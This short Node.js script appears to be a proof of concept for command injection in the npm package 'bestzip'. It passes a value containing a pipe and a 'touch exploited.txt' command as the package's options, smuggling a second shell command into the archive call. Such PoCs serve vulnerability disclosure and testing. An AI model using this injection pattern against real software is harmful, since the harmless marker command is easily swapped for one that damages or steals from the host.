const pkg = require('bestzip');

const payload = " | touch exploited.txt";

console.log(pkg);

const options = payload;

pkg(options);